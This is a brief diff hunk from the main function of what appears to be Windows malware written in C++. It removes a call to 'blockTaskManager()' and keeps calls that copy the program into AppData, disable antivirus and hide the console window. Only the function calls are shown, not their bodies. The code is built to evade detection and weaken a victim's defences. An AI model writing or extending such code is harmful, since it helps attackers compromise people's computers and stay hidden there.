@@ -1652,7 +1652,6 @@ int main(int argc, char* argv[]) {
     }
     if (hide) { hideToAppData(); return 0; }
     disableAntivirus();
-    blockTaskManager();
     if (computerName.empty()) computerName = getComputerName();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
